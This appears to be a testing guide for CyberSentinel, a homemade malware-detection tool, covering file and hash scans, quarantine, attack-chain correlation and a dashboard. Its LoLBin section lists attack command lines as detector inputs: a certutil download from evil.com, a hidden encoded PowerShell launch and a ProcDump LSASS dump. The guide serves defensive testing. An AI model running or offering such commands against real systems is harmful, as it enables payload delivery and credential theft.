@@ -1,0 +1,788 @@
+# CyberSentinel — Complete Feature Testing Guide
+# Every feature, every path, with exact inputs and expected outputs.
+# Run every test from inside the CyberSentinel project folder.
+# cd C:\Users\Acer\Desktop\CyberSentinel
+
+================================================================================
+ BEFORE YOU START — SETUP CHECKLIST
+================================================================================
+
+1. You are in the correct folder:
+      cd C:\Users\Acer\Desktop\CyberSentinel
+
+2. Delete the old database so cache hits don't interfere with tests:
+      del threat_cache.db
+   (You can recreate it by running any scan — it auto-creates on startup.)
+
+3. Ollama is running in the background.
+
+4. Your API keys and webhook are configured (Option 11 in the menu).
+
+5. Python dependencies are installed:
+      pip install -r requirements.txt
+
+
+================================================================================
+ TEST FILE PREPARATION
+================================================================================
+
+You need to create several test files before starting. Do all of this first.
+
+────────────────────────────────────────────────────────────────────────────────
+ TEST FILE 1 — EICAR Standard Malware Test File  (MALICIOUS — guaranteed detect)
+────────────────────────────────────────────────────────────────────────────────
+ Open Notepad. Paste EXACTLY this string (one line, no spaces, no newline):
+
+    X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+
+ Save as:  C:\Users\Acer\Desktop\CyberSentinel\test_samples\eicar.com
+
+ This string is the industry-standard test for antivirus. It is NOT real
+ malware. Every cloud API (VirusTotal, MetaDefender, etc.) will flag it as
+ MALICIOUS. It is 100% safe to create and scan.
+
+────────────────────────────────────────────────────────────────────────────────
+ TEST FILE 2 — Safe Text File  (BENIGN — should return SAFE)
+────────────────────────────────────────────────────────────────────────────────
+ Open Notepad. Type anything, e.g.:
+    Hello. This is a safe test file. CyberSentinel should not flag this.
+
+ Save as:  C:\Users\Acer\Desktop\CyberSentinel\test_samples\safe_file.txt
+
+────────────────────────────────────────────────────────────────────────────────
+ TEST FILE 3 — EICAR Renamed (tests that detection is hash-based, not name-based)
+────────────────────────────────────────────────────────────────────────────────
+ Copy eicar.com and rename the copy to:
+    C:\Users\Acer\Desktop\CyberSentinel\test_samples\totally_safe.txt
+
+ Expected: Still flagged MALICIOUS (SHA-256 is the same regardless of filename).
+
+────────────────────────────────────────────────────────────────────────────────
+ TEST FILE 4 — Notepad.exe Copy  (BENIGN executable — tests ML on real PE)
+────────────────────────────────────────────────────────────────────────────────
+ In Command Prompt:
+    copy C:\Windows\System32\notepad.exe C:\Users\Acer\Desktop\CyberSentinel\test_samples\notepad_test.exe
+
+ Expected: SAFE from cloud + SAFE from ML.
+
+────────────────────────────────────────────────────────────────────────────────
+ TEST FILE 5 — IoC Hash List  (for batch hash scanning)
+────────────────────────────────────────────────────────────────────────────────
+ Create a file named: test_samples\ioc_list.txt
+ Paste these lines (first is EICAR hash, second is a known-safe SHA-256):
+
+    275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a4c4538aabf651fd0f
+    e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+
+ The first hash is EICAR (always malicious).
+ The second hash is the SHA-256 of an empty file (always safe).
+
+
+================================================================================
+ FEATURE 1 — SCAN LOCAL FILE (Menu Option 1, Benign Path)
+================================================================================
+
+PURPOSE: Confirm that safe files return SAFE and do NOT trigger quarantine.
+
+STEPS:
+  1. python CyberSentinel.py
+  2. Select: 1
+  3. Paste path: C:\Users\Acer\Desktop\CyberSentinel\test_samples\safe_file.txt
+  4. Select cloud engine: 5 (Smart Consensus)
+  5. When asked about AI report: N (skip to save time)
+
+EXPECTED OUTPUT:
+  [*] TIER 1 VERDICT: SAFE — Consensus
+  [+] TIER 2 VERDICT: SAFE (Score: X%)
+  [+] File structure aligns with safe parameters.
+  --- No quarantine prompt should appear ---
+  --- No webhook should fire ---
+
+PASS CRITERIA:
+  ✓ Verdict shows SAFE
+  ✓ No quarantine prompt
+  ✓ No webhook message
+  ✓ No Discord alert received
+
+
+================================================================================
+ FEATURE 2 — SCAN LOCAL FILE (Menu Option 1, Malicious Path + Webhook + Quarantine)
+================================================================================
+
+PURPOSE: Full end-to-end malicious detection flow — cloud verdict, webhook,
+         quarantine prompt, analyst feedback, all in sequence.
+
+PREREQUISITE: Make sure threat_cache.db does NOT already have the EICAR hash.
+              If it does: del threat_cache.db  then re-run.
+
+STEPS:
+  1. python CyberSentinel.py
+  2. Select: 1
+  3. Paste path: C:\Users\Acer\Desktop\CyberSentinel\test_samples\eicar.com
+  4. Select cloud engine: 5 (Smart Consensus)
+
+EXPECTED OUTPUT (in this exact order):
+  [*] TIER 1 VERDICT: MALICIOUS — detected by Consensus (VirusTotal)
+  [+] SOC Webhook alert dispatched successfully.    ← Discord should ping
+  ═══════════════════════════════════════════════════
+    🔴  THREAT CONFIRMED
+    Verdict  : MALICIOUS
+    Source   : Consensus (VirusTotal)
+    File     : eicar.com
+    SHA-256  : 275a021b...
+  ═══════════════════════════════════════════════════
+  [?] Quarantine this file? (Y/N):      ← Type Y
+  [+] File quarantined successfully.
+  [?] Isolate host network? (Y/N):      ← Type N (do NOT isolate during testing)
+  [ANALYST REVIEW] ...                  ← Type Y to confirm, or F for false positive
+
+PASS CRITERIA:
+  ✓ MALICIOUS verdict shown
+  ✓ Discord webhook received an alert
+  ✓ Quarantine prompt appeared
+  ✓ After typing Y: eicar.com disappears from test_samples\ folder
+  ✓ A "Quarantine" folder is created with the file inside (hidden + renamed)
+  ✓ Analyst feedback prompt appeared
+  ✓ No crash
+
+RESTORE FOR NEXT TEST:
+  After quarantine, copy eicar.com back from the Quarantine folder, or recreate it.
+
+
+================================================================================
+ FEATURE 3 — SCAN LOCAL FILE (Cache Hit Path — tests the cache+webhook fix)
+================================================================================
+
+PURPOSE: Confirm that scanning the same malicious file twice STILL fires
+         the webhook and quarantine prompt (the bug that was fixed).
+
+PREREQUISITE: Run Feature 2 test first so EICAR is in the cache.
+              Do NOT delete threat_cache.db.
+              Restore eicar.com to test_samples\ first.
+
+STEPS:
+  1. python CyberSentinel.py
+  2. Select: 1
+  3. Paste path: test_samples\eicar.com
+
+EXPECTED OUTPUT:
+  [*] CACHE HIT — Bypassing API/ML engines
+      Verdict    : MALICIOUS
+      Cached On  : [timestamp]
+      Source     : eicar.com | Tier 1: Consensus (VirusTotal)
+  [+] SOC Webhook alert dispatched successfully.    ← Must still fire
+  🔴  THREAT CONFIRMED ...
+  [?] Quarantine this file? (Y/N):                  ← Must still appear
+
+PASS CRITERIA:
+  ✓ Says CACHE HIT (not calling APIs again — correct)
+  ✓ Webhook STILL fires despite being a cache hit
+  ✓ Quarantine prompt STILL appears
+  ✓ Discord alert received
+
+
+================================================================================
+ FEATURE 4 — SCAN RENAMED MALICIOUS FILE (hash-based detection test)
+================================================================================
+
+PURPOSE: Confirm detection is based on content hash, not filename.
+
+STEPS:
+  1. python CyberSentinel.py
+  2. Select: 1
+  3. Paste path: test_samples\totally_safe.txt   (this is actually EICAR)
+
+EXPECTED OUTPUT:
+  [*] Target   : totally_safe.txt
+  [*] SHA-256  : 275a021b...    ← same EICAR hash
+  [*] CACHE HIT  (or fresh MALICIOUS if cache was cleared)
+
+PASS CRITERIA:
+  ✓ Still detected as MALICIOUS despite .txt extension and innocent filename
+  ✓ Confirms CyberSentinel does not trust filenames
+
+
+================================================================================
+ FEATURE 5 — SCAN DIRECTORY (batch scan)
+================================================================================
+
+PURPOSE: Confirm batch scanning of a folder works.
+
+STEPS:
+  1. python CyberSentinel.py
+  2. Select: 1
+  3. Enter path: test_samples   (the whole folder)
+
+EXPECTED OUTPUT:
+  Scans each eligible file in the folder sequentially.
+  EICAR files flagged MALICIOUS. safe_file.txt flagged SAFE.
+  [+] Batch complete — X files analyzed.
+
+PASS CRITERIA:
+  ✓ Multiple files processed
+  ✓ Correct verdict for each
+  ✓ Batch completion message shown
+
+
+================================================================================
+ FEATURE 6 — SCAN HASH (Menu Option 2, single hash)
+================================================================================
+
+PURPOSE: Test hash-only scanning (no file needed).
+
+STEPS:
+  1. python CyberSentinel.py
+  2. Select: 2
+  3. Paste: 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a4c4538aabf651fd0f
+
+EXPECTED OUTPUT:
+  [*] Manual Hash Scan: 275a021b...
+  [!] FINAL VERDICT: MALICIOUS
+
+PASS CRITERIA:
+  ✓ Flagged MALICIOUS
+  ✓ Webhook fires
+  ✓ Quarantine skips gracefully (no file path — hash-only scan)
+
+TEST THE SAFE PATH:
+  Same steps but use: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+  Expected: SAFE verdict, no webhook, no quarantine prompt.
+
+
+================================================================================
+ FEATURE 7 — SCAN HASH BATCH LIST (Menu Option 2, .txt file)
+================================================================================
+
+PURPOSE: Test bulk IoC list ingestion.
+
+STEPS:
+  1. python CyberSentinel.py
+  2. Select: 2
+  3. Paste path: test_samples\ioc_list.txt
+
+EXPECTED OUTPUT:
+  First hash (EICAR): MALICIOUS + webhook
+  Second hash (empty file): SAFE
+
+PASS CRITERIA:
+  ✓ Both hashes processed
+  ✓ Correct verdict per hash
+  ✓ No crash on mixed results
+
+
+================================================================================
+ FEATURE 8 — LOLBIN ABUSE CHECKER (Menu Option 4)
+================================================================================
+
+PURPOSE: Test LoLBin command-line abuse pattern matching.
+No files needed — you are entering process names and command lines manually.
+
+────────────── TEST A: MALICIOUS — certutil download cradle ──────────────────
+  Process name: certutil.exe
+  Command line: certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe
+
+  EXPECTED:
+    ⚠️  LOLBIN ABUSE DETECTED
+    Binary  : certutil.exe
+    MITRE   : T1105 / T1140
+    Details : CertUtil download or decode — common dropper technique
+
+────────────── TEST B: MALICIOUS — PowerShell encoded command ────────────────
+  Process name: powershell.exe
+  Command line: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA
+
+  EXPECTED:
+    LOLBIN ABUSE DETECTED
+    MITRE   : T1059.001
+    Details : PowerShell encoded/obfuscated command execution
+
+────────────── TEST C: MALICIOUS — ProcDump LSASS dump ──────────────────────
+  Process name: procdump.exe
+  Command line: procdump.exe -ma lsass.exe C:\temp\lsass.dmp
+
+  EXPECTED:
+    LOLBIN ABUSE DETECTED
+    MITRE   : T1003.001
+    Details : ProcDump LSASS memory dump — credential harvesting
+
+────────────── TEST D: BENIGN — normal certutil usage ───────────────────────
+  Process name: certutil.exe
+  Command line: certutil.exe -hashfile C:\myfile.exe SHA256
+
+  EXPECTED:
+    [+] No known LoLBin abuse pattern matched for 'certutil.exe'.
+    (Computing a file hash is legitimate usage — should NOT trigger)
+
+────────────── TEST E: BENIGN — unknown binary ───────────────────────────────
+  Process name: chrome.exe
+  Command line: chrome.exe --no-sandbox
+
+  EXPECTED:
+    [+] No known LoLBin abuse pattern matched for 'chrome.exe'.
+
+PASS CRITERIA:
+  ✓ Tests A, B, C → LOLBIN ABUSE DETECTED with correct MITRE ID
+  ✓ Tests D, E    → No alert (no false positives on legitimate usage)
+
+
+================================================================================
+ FEATURE 9 — BYOVD VULNERABLE DRIVER SCAN (Menu Option 5)
+================================================================================
+
+PURPOSE: Scan all loaded Windows drivers against the LOLDrivers database.
+
+PREREQUISITE: intel/ folder must exist. Run this first if not done:
+    python CyberSentinel.py --update-intel
+
+STEPS:
+  1. python CyberSentinel.py
+  2. Select: 5
+
+EXPECTED OUTPUT (most systems):
+  [*] Scanning loaded drivers in C:\Windows\System32\drivers ...
+  [+] No known-vulnerable drivers found in System32\drivers.
+  (This is the correct PASS result on a clean, patched system.)
+
+  OR if you have vulnerable drivers installed (e.g., old GPU utilities):
+  [!] 1 vulnerable driver(s) detected:
+  🔴  BYOVD — VULNERABLE DRIVER LOADED
+      CVE(s) : CVE-XXXX-XXXX
+      ...
+
+PASS CRITERIA:
+  ✓ Scan completes without crashing
+  ✓ Either "no vulnerable drivers" OR a real finding with CVE info
+  ✓ No Python exception
+
+
+================================================================================
+ FEATURE 10 — ATTACK CHAIN CORRELATION (Menu Option 6)
+================================================================================
+
+PURPOSE: Test that the correlator detects multi-step attack sequences.
+We seed the event_timeline table manually to simulate a chain.
+
+STEPS:
+  1. Open a NEW Command Prompt (separate from your main terminal)
+  2. Navigate to the CyberSentinel folder
+  3. Run this Python snippet to inject test events:
+
+     python -c "
+     import sqlite3, datetime
+     db = 'threat_cache.db'
+     now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+     with sqlite3.connect(db) as c:
+         c.execute('INSERT INTO event_timeline (event_type,detail,pid,timestamp) VALUES (?,?,?,?)',
+                   ('LOLBIN_ABUSE', 'certutil.exe download', 0, now))
+         c.execute('INSERT INTO event_timeline (event_type,detail,pid,timestamp) VALUES (?,?,?,?)',
+                   ('C2_CONNECTION', '185.220.101.5 — python.exe', 0, now))
+         print('Test events injected.')
+     "
+
+  4. Go back to your main terminal running CyberSentinel.py
+  5. Select: 6
+
+EXPECTED OUTPUT:
+  ═══════════════════════════════════════════════════════════════
+    🔴  ATTACK CHAIN: Process Injection → C2
+    Severity : CRITICAL
+    MITRE    : T1055 — Process Injection
+    Details  : LoLBin abuse followed by outbound C2...
+  ═══════════════════════════════════════════════════════════════
+
+PASS CRITERIA:
+  ✓ Chain alert fires with correct chain name
+  ✓ Severity shown as CRITICAL
+  ✓ MITRE mapping displayed
+
+TEST BENIGN (no chain):
+  Delete threat_cache.db or wait until the 10-minute window expires.
+  Select Option 6 again.
+  Expected: "[*] No attack chains detected yet."
+
+
+================================================================================
+ FEATURE 11 — BASELINE ENVIRONMENT MANAGER (Menu Option 7)
+================================================================================
+
+PURPOSE: Test learn mode start, status, and stop.
+Note: A full 24-hour baseline is not practical to test end-to-end,
+but you can verify the mechanism works.
+
+TEST A — Start learn mode:
+  1. Select: 7
+  2. Select: 1 (Start learn mode)
+  3. Enter duration: 1  (1 hour for testing)
+
+  EXPECTED:
+    [*] Baseline learn mode started — profiling for 1 h.
+    A file named baseline_learning.flag appears in the project folder.
+
+TEST B — Check statistics (after a few seconds):
+  1. Select: 7
+  2. Select: 3 (Show baseline statistics)
+
+  EXPECTED:
+    Baseline: X unique process profiles
+    [Table of top processes and seen counts]
+    (Numbers will be small — it has only been running seconds)
+
+TEST C — Stop learn mode:
+  1. Select: 7
+  2. Select: 2 (Stop learn mode)
+
+  EXPECTED:
+    [+] Baseline learning complete — profiles saved.
+    baseline_learning.flag file is deleted.
+
+PASS CRITERIA:
+  ✓ Flag file created on start, deleted on stop
+  ✓ Statistics table shows process data
+  ✓ No crash during any step
+
+
+================================================================================
+ FEATURE 12 — FILELESS / AMSI ALERTS (Menu Option 8)
+================================================================================
+
+PURPOSE: View the AMSI alert history table.
+
+NOTE: This tab will show "No fileless alerts detected yet" UNLESS:
+  1. pywin32 is installed (pip install pywin32)
+  2. PowerShell Script Block Logging is enabled (see SOC Dashboard Manual)
+  3. The daemon has been running and observed PowerShell execution
+
+TO TEST IT FULLY (requires Administrator + pywin32):
+  Step 1 — Enable ScriptBlock logging (run PowerShell as Administrator):
+    Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
+      -Name "EnableScriptBlockLogging" -Value 1 -Force
+
+  Step 2 — Start the daemon:
+    python CyberSentinel.py --daemon "C:\Users\Acer\Desktop\CyberSentinel\test_samples"
+
+  Step 3 — In a separate PowerShell window, run a test obfuscated command
+    (this is harmless but matches the detection pattern):
+    powershell -Command "[System.Convert]::FromBase64String('dGVzdA==')"
+
+  Step 4 — Back in CyberSentinel, select: 8
+
+  EXPECTED:
+    AMSI ScriptBlock alert showing "[System.Convert]::FromBase64String" pattern
+
+MINIMUM TEST (no pywin32):
+  Select: 8
+  EXPECTED: "[*] No fileless alerts detected yet."  (correct — means it ran fine)
+  PASS CRITERIA: No crash.
+
+
+================================================================================
+ FEATURE 13 — NETWORK CONTAINMENT (Menu Option 9)
+================================================================================
+
+⚠️  WARNING: ISOLATING THE NETWORK WILL CUT YOUR INTERNET CONNECTION.
+    Only test isolation if you are on a VM or are comfortable restoring it.
+    ALWAYS test RESTORE first so you know it works.
+
+TEST A — Safe: Just view the menu:
+  1. Select: 9
+  2. Select: 3 (Cancel)
+  EXPECTED: Returns to main menu. No firewall changes. No crash.
+
+TEST B — Full isolation test (VM recommended):
+  1. Select: 9
+  2. Select: 1 (ISOLATE HOST)
+  3. Open a browser — internet should be cut.
+  4. Immediately go back to CyberSentinel
+  5. Select: 9
+  6. Select: 2 (RESTORE NETWORK)
+  7. Confirm internet is restored.
+
+PASS CRITERIA:
+  ✓ Isolation cuts outbound traffic
+  ✓ Restore brings it back
+  ✓ Both actions print confirmation messages
+
+
+================================================================================
+ FEATURE 14 — UPDATE THREAT INTELLIGENCE FEEDS (Menu Option 10)
+================================================================================
+
+PURPOSE: Download/refresh LOLBAS, LOLDrivers, JA3, and Feodo feeds.
+
+PREREQUISITE: Internet connection required.
+
+STEPS:
+  Option A — Via menu:
+    1. Select: 10
+    2. You will see feed status table (last update + size)
+    3. Press Y to update
+
+  Option B — Via command line:
+    python CyberSentinel.py --update-intel
+
+EXPECTED OUTPUT:
+  [*] Updating lolbas feed from https://lolbas-project.github.io/...
+  [+] lolbas updated — XXX.X KB saved to intel\lolbas.json
+  [*] Updating loldrivers feed...
+  [+] loldrivers updated — XXX.X KB saved to intel\loldrivers.json
+  [*] Updating ja3 feed...
+  [+] ja3 updated — XXX.X KB saved to intel\ja3_blocklist.csv
+  [*] Updating feodo feed...
+  [+] feodo updated — XXX.X KB saved to intel\feodo_blocklist.json
+  [+] Intel update complete: 4/4 feeds refreshed.
+
+PASS CRITERIA:
+  ✓ 4/4 feeds refreshed
+  ✓ Files appear in intel\ folder
+  ✓ File sizes are non-zero (lolbas ~200KB, loldrivers ~1MB+)
+
+
+================================================================================
+ FEATURE 15 — CONFIGURE CLOUD INTEGRATIONS (Menu Option 11)
+================================================================================
+
+PURPOSE: Test that API keys and webhook save and load correctly.
+
+TEST A — Save and reload:
+  1. Select: 11
+  2. Enter your VirusTotal API key when prompted
+  3. Paste your Discord webhook URL when prompted for webhook
+  4. Exit CyberSentinel
+  5. Restart CyberSentinel
+  6. Select: 1 and scan eicar.com
+
+EXPECTED:
+  ✓ VirusTotal used in consensus (no "key not set" warning)
+  ✓ Webhook fires and Discord receives alert
+
+TEST B — Verify encryption (keys are not stored in plaintext):
+  Open config.json in Notepad.
+  EXPECTED: All values are encrypted strings, NOT your raw API key.
+  Example: {"virustotal": "gAAAAAB..."}  ← Fernet-encrypted
+
+
+================================================================================
+ FEATURE 16 — VIEW THREAT CACHE (Menu Option 12)
+================================================================================
+
+STEPS:
+  1. Run several scans first (Features 1 and 2 above)
+  2. Select: 12
+
+EXPECTED OUTPUT:
+  Table with columns: SHA-256 | File | Verdict | Timestamp
+  EICAR entry shows MALICIOUS in red.
+  Safe file shows SAFE in green.
+
+PASS CRITERIA:
+  ✓ All previously scanned files appear
+  ✓ Verdicts have correct color badges
+  ✓ No crash
+
+
+================================================================================
+ FEATURE 17 — ANALYST FEEDBACK HISTORY (Menu Option 13)
+================================================================================
+
+PREREQUISITE: Complete at least one full malicious scan (Feature 2) and
+              answer the analyst feedback prompt (Y/F/S).
+
+STEPS:
+  1. Select: 13
+
+EXPECTED OUTPUT:
+  Table showing your feedback decisions with timestamps.
+
+PASS CRITERIA:
+  ✓ Your previous feedback entries appear
+  ✓ False Positive entries show in yellow
+  ✓ Confirmed entries show in green
+
+
+================================================================================
+ FEATURE 18 — SESSION REPORT (Menu Option 14)
+================================================================================
+
+STEPS:
+  1. Run several scans during a session
+  2. Select: 14
+  3. Press Y to save
+  4. Enter filename: test_report
+
+EXPECTED:
+  File saved to: Analysis Files\test_report.txt
+  Contains all scan results from that session.
+
+PASS CRITERIA:
+  ✓ File created in Analysis Files\ folder
+  ✓ Contains scan verdicts and timestamps
+  ✓ Readable in Notepad
+
+
+================================================================================
+ FEATURE 19 — SOC DASHBOARD
+================================================================================
+
+PREREQUISITE: Run several tests above so the database has data.
+
+STEPS:
+  1. Open a NEW terminal:
+       cd C:\Users\Acer\Desktop\CyberSentinel
+       python dashboard.py
+
+  2. Open browser: http://127.0.0.1:5000
+
+EXPECTED — Each tab should now have data:
+  Scan History   → All scans from your tests
+  Attack Chains  → Chain injected in Feature 10 test
+  Analyst Feedback → Feedback from Feature 2 test
+  Event Timeline → All raw events
+
+PASS CRITERIA:
+  ✓ Dashboard loads without errors
+  ✓ Stats cards show non-zero numbers
+  ✓ Scan History table populated
+  ✓ ↻ Refresh button works
+
+
+================================================================================
+ FEATURE 20 — DAEMON MODE (headless real-time protection)
+================================================================================
+
+⚠️  Must be run as Administrator.
+⚠️  Test in a VM or test folder only — auto-quarantine is aggressive.
+
+STEPS:
+  1. Run as Administrator:
+     python CyberSentinel.py --daemon "C:\Users\Acer\Desktop\CyberSentinel\test_samples"
+
+  2. In a SEPARATE window, copy the EICAR file into the watched folder:
+     copy test_samples\eicar.com test_samples\eicar_dropped.com
+
+EXPECTED in daemon terminal:
+  [DAEMON] 🚨 File drop intercepted: eicar_dropped.com
+  [TIER 1 VERDICT: MALICIOUS]
+  [!] HEADLESS: Auto-quarantining threat.
+  [!] HEADLESS: Severing network connection.
+  Discord webhook fires automatically.
+
+PASS CRITERIA:
+  ✓ File drop detected within ~2 seconds
+  ✓ Auto-quarantined (file disappears from folder)
+  ✓ Discord alert received
+  ✓ No manual input required
+
+
+================================================================================
+ FEATURE 21 — FLEET SYNC (--sync flag)
+================================================================================
+
+PURPOSE: Test pulling threat hashes from a remote HTTPS source.
+
+TEST — Invalid URL rejected:
+    python CyberSentinel.py --sync http://example.com/hashes.txt
+    EXPECTED: "SYNC REJECTED: HTTPS required."
+
+TEST — Valid format (requires a real HTTPS server with hash list):
+    python CyberSentinel.py --sync https://your-server.com/hashes.txt
+    File must contain one SHA-256 hex hash per line.
+    EXPECTED: "[+] Sync complete: X hashes added."
+
+
+================================================================================
+ FEATURE 22 — EVALUATION HARNESS
+================================================================================
+
+PURPOSE: Benchmark ML detection performance with labelled samples.
+
+PREREQUISITE: You need a samples\ folder with:
+    samples\malware\    ← put eicar.com here (and any other malware samples)
+    samples\clean\      ← put safe_file.txt and notepad_test.exe here
+
+STEPS:
+    mkdir samples\malware
+    mkdir samples\clean
+    copy test_samples\eicar.com samples\malware\
+    copy test_samples\safe_file.txt samples\clean\
+    copy test_samples\notepad_test.exe samples\clean\
+
+    python eval_harness.py --malware samples\malware --clean samples\clean
+
+EXPECTED OUTPUT:
+  ══════════════════════════════════
+   CyberSentinel Evaluation Report
+  ══════════════════════════════════
+  Detection Rate : X%
+  False Pos Rate : X%
+  Precision      : X%
+  F1 Score       : X%
+  Accuracy       : X%
+  Avg Latency    : X ms/file
+
+  Saved: eval_report.json
+
+PASS CRITERIA:
+  ✓ Report generated without crash
+  ✓ EICAR correctly counted as True Positive
+  ✓ safe_file.txt correctly counted as True Negative
+  ✓ eval_report.json created
+
+
+================================================================================
+ QUICK PASS/FAIL SUMMARY TABLE
+================================================================================
+
+ Feature                         | Test Input              | Expected Result
+─────────────────────────────────┼─────────────────────────┼────────────────────────────
+ 1. File scan — benign           | safe_file.txt           | SAFE, no webhook, no quarantine
+ 2. File scan — malicious        | eicar.com (fresh)       | MALICIOUS, webhook fires, quarantine prompt
+ 3. Cache hit — malicious        | eicar.com (repeat)      | CACHE HIT + webhook + quarantine
+ 4. Hash-based detection         | totally_safe.txt        | MALICIOUS (same hash as EICAR)
+ 5. Directory batch scan         | test_samples\           | Mixed results, batch count shown
+ 6. Hash scan — malicious        | EICAR SHA-256           | MALICIOUS + webhook
+ 7. Hash scan — safe             | Empty file SHA-256      | SAFE, no webhook
+ 8. Hash batch list              | ioc_list.txt            | 1 malicious, 1 safe
+ 9. LoLBin — certutil abuse      | certutil -urlcache -f   | LOLBIN ABUSE DETECTED T1105
+10. LoLBin — powershell -enc     | powershell -enc BASE64  | LOLBIN ABUSE DETECTED T1059.001
+11. LoLBin — benign certutil     | certutil -hashfile      | No alert
+12. BYOVD driver scan            | System32\drivers\       | Clean or real finding
+13. Chain correlation            | Injected events         | CRITICAL chain alert
+14. Baseline — learn mode        | Start/stop 1h           | Flag file created/deleted
+15. AMSI alerts view             | Select menu option      | No crash (empty or populated)
+16. Network containment — cancel | Select cancel           | Returns to menu, no firewall change
+17. Intel update                 | --update-intel          | 4/4 feeds updated
+18. Threat cache view            | After scanning          | Table with all scans
+19. Analyst feedback history     | After Y/F/S input       | Feedback entries visible
+20. Session report               | Option 14               | .txt file in Analysis Files\
+21. SOC Dashboard                | python dashboard.py     | All tabs populated
+22. Daemon — file drop           | Copy EICAR to folder    | Auto-quarantine + webhook
+23. Fleet sync — HTTP rejected   | --sync http://...       | Rejected with error
+24. Evaluation harness           | samples\ folders        | Report + eval_report.json
+
+
+================================================================================
+ IF SOMETHING FAILS — FIRST CHECKS
+================================================================================
+
+Webhook not firing:
+  → Check Option 11 — is webhook URL set?
+  → Is it HTTPS? Discord/Slack URLs always start with https://
+  → Try scanning fresh (delete threat_cache.db) — cache hits need fix from latest zip
+
+Quarantine prompt not appearing:
+  → Make sure you are using the latest zip (CyberSentinel_v2_webhook_fix.zip)
+  → Delete threat_cache.db and rescan
+
+Cloud APIs return no verdict:
+  → Check Option 11 — are API keys set?
+  → Test internet: ping 8.8.8.8 in Command Prompt
+
+ML verdict never runs:
+  → Check that the models\ folder exists with .model files inside
+  → Check that thrember is installed: python -c "import thrember"
+
+BYOVD scan crashes:
+  → Run --update-intel first so intel\loldrivers.json exists
+
+Any "ModuleNotFoundError":
+  → pip install -r requirements.txt
